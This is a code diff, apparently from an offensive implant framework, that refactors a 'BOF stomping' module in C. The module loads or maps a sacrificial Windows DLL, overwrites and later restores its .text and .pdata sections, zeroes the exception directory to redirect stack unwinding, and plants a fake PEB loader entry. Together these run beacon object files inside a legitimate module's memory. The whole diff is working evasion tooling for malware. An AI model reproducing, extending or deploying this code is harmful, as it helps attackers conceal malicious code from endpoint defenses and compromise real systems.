@@ -1,8 +1,6 @@
 #include "bof_stomp.h"
 #include "utils.h"
 
-BOF_STOMP_CTX g_BofStomp = { 0 };
-
 #ifndef SEC_IMAGE
 #define SEC_IMAGE 0x01000000
 #endif
@@ -18,6 +16,10 @@ BOF_STOMP_CTX g_BofStomp = { 0 };
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
+
+// ---------------------------------------------------------------------------
+// Method 1 helpers — fake PEB LDR entry
+// ---------------------------------------------------------------------------
 
 #if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1
 
@@ -103,90 +105,122 @@ static void RemoveFakePebLdrEntry(PLDR_DATA_TABLE_ENTRY entry)
     MemFreeLocal(&ptr, FAKE_LDR_BLOCK_BYTES);
 }
 
-#endif
+#endif // BOF_STOMP_METHOD == 1
 
-#if !defined(BOF_STOMP_METHOD) || BOF_STOMP_METHOD == 0
+// ---------------------------------------------------------------------------
+// Internal: find .text section inside a mapped PE image
+// ---------------------------------------------------------------------------
 
-static BOOL InitBofStompLoadLibrary(const char* sacrificialDll)
+static BOOL FindTextSection(PVOID base, PVOID* outTextBase, SIZE_T* outTextSize)
 {
-    HMODULE hMod = ApiWin->LoadLibraryExA((LPCSTR)sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
-    if (!hMod)
-        return FALSE;
-
-    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)hMod;
-    PIMAGE_NT_HEADERS     nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)hMod + dos->e_lfanew);
+    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS     nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)base + dos->e_lfanew);
     PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
-
-    PVOID  textBase = NULL;
-    SIZE_T textSize = 0;
 
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
         if ((*(DWORD*)sec->Name | 0x20202020) == 'xet.') {
-            textBase = (PVOID)((ULONG_PTR)hMod + sec->VirtualAddress);
-            textSize = sec->Misc.VirtualSize;
-            break;
+            *outTextBase = (PVOID)((ULONG_PTR)base + sec->VirtualAddress);
+            *outTextSize = sec->Misc.VirtualSize;
+            return TRUE;
         }
     }
+    return FALSE;
+}
 
-    if (!textBase || textSize == 0)
-        return FALSE;
+// ---------------------------------------------------------------------------
+// Method 0 — LoadLibraryEx(DONT_RESOLVE_DLL_REFERENCES)
+// ---------------------------------------------------------------------------
+
+#if !defined(BOF_STOMP_METHOD) || BOF_STOMP_METHOD == 0
+
+static BOF_STOMP_CTX* CreateBofStompLoadLibrary(const char* sacrificialDll)
+{
+    HMODULE hMod = ApiWin->LoadLibraryExA((LPCSTR)sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (!hMod)
+        return NULL;
+
+    PVOID  textBase = NULL;
+    SIZE_T textSize = 0;
+    if (!FindTextSection((PVOID)hMod, &textBase, &textSize)) {
+        ApiWin->FreeLibrary(hMod);
+        return NULL;
+    }
 
     PVOID saved = MemAllocLocal((DWORD)textSize);
-    if (!saved)
-        return FALSE;
+    if (!saved) {
+        ApiWin->FreeLibrary(hMod);
+        return NULL;
+    }
     memcpy(saved, textBase, textSize);
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)hMod + dos->e_lfanew);
 
     PVOID pdataBase = NULL;
     DWORD pdataSize = 0;
+    PVOID savedPdata = NULL;
     {
         PIMAGE_DATA_DIRECTORY excDir =
             &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
         if (excDir->VirtualAddress && excDir->Size) {
             pdataBase = (PVOID)((ULONG_PTR)hMod + excDir->VirtualAddress);
             pdataSize = excDir->Size;
+            savedPdata = MemAllocLocal(pdataSize);
+            if (!savedPdata) {
+                LPVOID savedPtr = saved;
+                MemFreeLocal(&savedPtr, (DWORD)textSize);
+                ApiWin->FreeLibrary(hMod);
+                return NULL;
+            }
+            memcpy(savedPdata, pdataBase, pdataSize);
         }
     }
 
-    PVOID savedPdata = NULL;
-    if (pdataBase && pdataSize) {
-        savedPdata = MemAllocLocal(pdataSize);
-        if (!savedPdata) {
-            LPVOID savedPtr = saved;
-            MemFreeLocal(&savedPtr, (DWORD)textSize);
-            return FALSE;
+    BOF_STOMP_CTX* ctx = (BOF_STOMP_CTX*)MemAllocLocal(sizeof(BOF_STOMP_CTX));
+    if (!ctx) {
+        if (savedPdata) {
+            LPVOID sp = savedPdata;
+            MemFreeLocal(&sp, pdataSize);
         }
-        memcpy(savedPdata, pdataBase, pdataSize);
+        LPVOID sv = saved;
+        MemFreeLocal(&sv, (DWORD)textSize);
+        ApiWin->FreeLibrary(hMod);
+        return NULL;
     }
+    memset(ctx, 0, sizeof(BOF_STOMP_CTX));
 
-    ApiWin->InitializeCriticalSection(&g_BofStomp.lock);
+    ctx->hModule       = hMod;
+    ctx->mappedView    = NULL;
+    ctx->viewSize      = 0;
+    ctx->method        = 0;
+    ctx->textBase      = textBase;
+    ctx->textSize      = textSize;
+    ctx->savedBytes    = saved;
+    ctx->savedSize     = (DWORD)textSize;
+    ctx->pdataBase     = pdataBase;
+    ctx->pdataSize     = pdataSize;
+    ctx->savedPdata    = savedPdata;
+    ctx->pdataCapacity = pdataSize ? (pdataSize / (sizeof(DWORD) * 3)) : 0;
+    ctx->moduleBase    = (PVOID)hMod;
+    ctx->pdataStomped  = FALSE;
+    ctx->cursorBase    = NULL;
+    ctx->cursorSize    = 0;
+    ctx->inUse         = FALSE;
+    ctx->initialised   = TRUE;
+    ctx->fakeLdrEntry  = NULL;
 
-    g_BofStomp.hModule       = hMod;
-    g_BofStomp.mappedView    = NULL;
-    g_BofStomp.viewSize      = 0;
-    g_BofStomp.method        = 0;
-    g_BofStomp.textBase      = textBase;
-    g_BofStomp.textSize      = textSize;
-    g_BofStomp.savedBytes    = saved;
-    g_BofStomp.savedSize     = (DWORD)textSize;
-    g_BofStomp.pdataBase     = pdataBase;
-    g_BofStomp.pdataSize     = pdataSize;
-    g_BofStomp.savedPdata    = savedPdata;
-    g_BofStomp.pdataCapacity = pdataSize ? (pdataSize / (sizeof(DWORD) * 3)) : 0;
-    g_BofStomp.moduleBase    = (PVOID)hMod;
-    g_BofStomp.pdataStomped  = FALSE;
-    g_BofStomp.cursorBase    = NULL;
-    g_BofStomp.cursorSize    = 0;
-    g_BofStomp.inUse         = FALSE;
-    g_BofStomp.initialised   = TRUE;
-
-    return TRUE;
+    return ctx;
 }
 
-#endif
+#endif // Method 0
+
+// ---------------------------------------------------------------------------
+// Method 1 — NtCreateSection + NtMapViewOfSection
+// ---------------------------------------------------------------------------
 
 #if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1
 
-static BOOL InitBofStompNtSection(const char* sacrificialDll)
+static BOF_STOMP_CTX* CreateBofStompNtSection(const char* sacrificialDll)
 {
     WCHAR ntPath[512];
     {
@@ -219,7 +253,7 @@ static BOOL InitBofStompNtSection(const char* sacrificialDll)
         FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
     );
     if (!NT_SUCCESS(status) || !hFile)
-        return FALSE;
+        return NULL;
 
     HANDLE hSection = NULL;
     status = ApiNt->NtCreateSection(
@@ -231,11 +265,10 @@ static BOOL InitBofStompNtSection(const char* sacrificialDll)
         SEC_IMAGE,
         hFile
     );
-
     ApiNt->NtClose(hFile);
 
     if (!NT_SUCCESS(status) || !hSection)
-        return FALSE;
+        return NULL;
 
     PVOID  viewBase = NULL;
     SIZE_T viewSize = 0;
@@ -243,49 +276,36 @@ static BOOL InitBofStompNtSection(const char* sacrificialDll)
         hSection,
         (HANDLE)(LONG_PTR)-1,
         &viewBase,
-        0,
-        0,
-        NULL,
-        &viewSize,
+        0, 0, NULL, &viewSize,
         ViewShare,
         0,
         PAGE_READONLY
     );
-
     ApiNt->NtClose(hSection);
 
     if (!NT_SUCCESS(status) || !viewBase)
-        return FALSE;
-
-    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)viewBase;
-    PIMAGE_NT_HEADERS     nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + dos->e_lfanew);
-    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+        return NULL;
 
     PVOID  textBase = NULL;
     SIZE_T textSize = 0;
-
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
-        if ((*(DWORD*)sec->Name | 0x20202020) == 'xet.') {
-            textBase = (PVOID)((ULONG_PTR)viewBase + sec->VirtualAddress);
-            textSize = sec->Misc.VirtualSize;
-            break;
-        }
-    }
-
-    if (!textBase || textSize == 0) {
+    if (!FindTextSection(viewBase, &textBase, &textSize)) {
         ApiNt->NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, viewBase);
-        return FALSE;
+        return NULL;
     }
 
     PVOID saved = MemAllocLocal((DWORD)textSize);
     if (!saved) {
         ApiNt->NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, viewBase);
-        return FALSE;
+        return NULL;
     }
     memcpy(saved, textBase, textSize);
 
-    PVOID pdataBase = NULL;
-    DWORD pdataSize = 0;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)viewBase;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)viewBase + dos->e_lfanew);
+
+    PVOID pdataBase  = NULL;
+    DWORD pdataSize  = 0;
+    PVOID savedPdata = NULL;
     {
         PIMAGE_DATA_DIRECTORY excDir =
             &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
@@ -293,6 +313,8 @@ static BOOL InitBofStompNtSection(const char* sacrificialDll)
             pdataBase = (PVOID)((ULONG_PTR)viewBase + excDir->VirtualAddress);
             pdataSize = excDir->Size;
         }
+        // Zero the data-directory entry so the unwinder falls through
+        // to our RtlAddFunctionTable dynamic entries.
         DWORD hdProt = 0;
         if (ApiWin->VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &hdProt)) {
             excDir->VirtualAddress = 0;
@@ -301,7 +323,6 @@ static BOOL InitBofStompNtSection(const char* sacrificialDll)
         }
     }
 
-    PVOID savedPdata = NULL;
     if (pdataBase && pdataSize) {
         savedPdata = MemAllocLocal(pdataSize);
         if (savedPdata) {
@@ -313,36 +334,118 @@ static BOOL InitBofStompNtSection(const char* sacrificialDll)
         }
     }
 
-    ApiWin->InitializeCriticalSection(&g_BofStomp.lock);
+    BOF_STOMP_CTX* ctx = (BOF_STOMP_CTX*)MemAllocLocal(sizeof(BOF_STOMP_CTX));
+    if (!ctx) {
+        if (savedPdata) {
+            LPVOID sp = savedPdata;
+            MemFreeLocal(&sp, pdataSize);
+        }
+        LPVOID sv = saved;
+        MemFreeLocal(&sv, (DWORD)textSize);
+        ApiNt->NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, viewBase);
+        return NULL;
+    }
+    memset(ctx, 0, sizeof(BOF_STOMP_CTX));
 
-    g_BofStomp.hModule     = NULL;
-    g_BofStomp.mappedView  = viewBase;
-    g_BofStomp.viewSize    = viewSize;
-    g_BofStomp.method      = 1;
-    g_BofStomp.textBase    = textBase;
-    g_BofStomp.textSize    = textSize;
-    g_BofStomp.savedBytes  = saved;
-    g_BofStomp.savedSize   = (DWORD)textSize;
-    g_BofStomp.pdataBase   = pdataBase;
-    g_BofStomp.pdataSize   = pdataSize;
-    g_BofStomp.savedPdata  = savedPdata;
-    g_BofStomp.cursorBase  = NULL;
-    g_BofStomp.cursorSize  = 0;
-    g_BofStomp.inUse       = FALSE;
-    g_BofStomp.initialised = TRUE;
-    g_BofStomp.fakeLdrEntry = InsertFakePebLdrEntry(viewBase, sacrificialDll);
+    ctx->hModule       = NULL;
+    ctx->mappedView    = viewBase;
+    ctx->viewSize      = viewSize;
+    ctx->method        = 1;
+    ctx->textBase      = textBase;
+    ctx->textSize      = textSize;
+    ctx->savedBytes    = saved;
+    ctx->savedSize     = (DWORD)textSize;
+    ctx->pdataBase     = pdataBase;
+    ctx->pdataSize     = pdataSize;
+    ctx->savedPdata    = savedPdata;
+    ctx->pdataCapacity = pdataSize ? (pdataSize / (sizeof(DWORD) * 3)) : 0;
+    ctx->moduleBase    = viewBase;
+    ctx->pdataStomped  = FALSE;
+    ctx->cursorBase    = NULL;
+    ctx->cursorSize    = 0;
+    ctx->inUse         = FALSE;
+    ctx->initialised   = TRUE;
+    ctx->fakeLdrEntry  = (PVOID)InsertFakePebLdrEntry(viewBase, sacrificialDll);
 
-    return TRUE;
+    return ctx;
 }
 
-#endif
+#endif // Method 1
 
-BOOL InitBofStomp(const char* sacrificialDll, int method)
+// ---------------------------------------------------------------------------
+// Public API
+// ---------------------------------------------------------------------------
+
+BOF_STOMP_CTX* BofStompCreate(const char* sacrificialDll, int method)
 {
     (void)method;
 #if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1
-    return InitBofStompNtSection(sacrificialDll);
+    return CreateBofStompNtSection(sacrificialDll);
 #else
-    return InitBofStompLoadLibrary(sacrificialDll);
+    return CreateBofStompLoadLibrary(sacrificialDll);
 #endif
+}
+
+void BofStompDestroy(BOF_STOMP_CTX* ctx)
+{
+    if (!ctx)
+        return;
+
+    if (!ctx->initialised) {
+        LPVOID p = ctx;
+        MemFreeLocal(&p, sizeof(BOF_STOMP_CTX));
+        return;
+    }
+
+    // Restore .pdata if it was stomped and not yet restored by CleanupSections
+    if (ctx->pdataStomped && ctx->savedPdata && ctx->pdataBase && ctx->pdataSize) {
+        DWORD oldProt = 0;
+        if (ApiWin->VirtualProtect(ctx->pdataBase, ctx->pdataSize, PAGE_READWRITE, &oldProt)) {
+            memcpy(ctx->pdataBase, ctx->savedPdata, ctx->pdataSize);
+            DWORD tmp = 0;
+            ApiWin->VirtualProtect(ctx->pdataBase, ctx->pdataSize, oldProt, &tmp);
+        }
+        ctx->pdataStomped = FALSE;
+    }
+
+    // Restore .text if it was stomped and not yet restored
+    if (ctx->inUse && ctx->cursorBase && ctx->savedBytes && ctx->cursorSize) {
+        DWORD oldProt = 0;
+        ApiWin->VirtualProtect(ctx->cursorBase, ctx->cursorSize, PAGE_EXECUTE_READWRITE, &oldProt);
+        memset(ctx->cursorBase, 0, ctx->cursorSize);
+        memcpy(ctx->cursorBase, ctx->savedBytes, ctx->cursorSize);
+        ApiWin->VirtualProtect(ctx->cursorBase, ctx->cursorSize, PAGE_EXECUTE_READ, &oldProt);
+    }
+
+    // Free saved copies
+    if (ctx->savedBytes) {
+        LPVOID p = ctx->savedBytes;
+        MemFreeLocal(&p, ctx->savedSize);
+        ctx->savedBytes = NULL;
+    }
+    if (ctx->savedPdata) {
+        LPVOID p = ctx->savedPdata;
+        MemFreeLocal(&p, ctx->pdataSize);
+        ctx->savedPdata = NULL;
+    }
+
+#if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1
+    // Remove the fake PEB LDR entry before unmapping
+    if (ctx->fakeLdrEntry) {
+        RemoveFakePebLdrEntry((PLDR_DATA_TABLE_ENTRY)ctx->fakeLdrEntry);
+        ctx->fakeLdrEntry = NULL;
+    }
+    if (ctx->mappedView) {
+        ApiNt->NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, ctx->mappedView);
+        ctx->mappedView = NULL;
+    }
+#else
+    if (ctx->hModule) {
+        ApiWin->FreeLibrary(ctx->hModule);
+        ctx->hModule = NULL;
+    }
+#endif
+
+    LPVOID p = ctx;
+    MemFreeLocal(&p, sizeof(BOF_STOMP_CTX));
 }
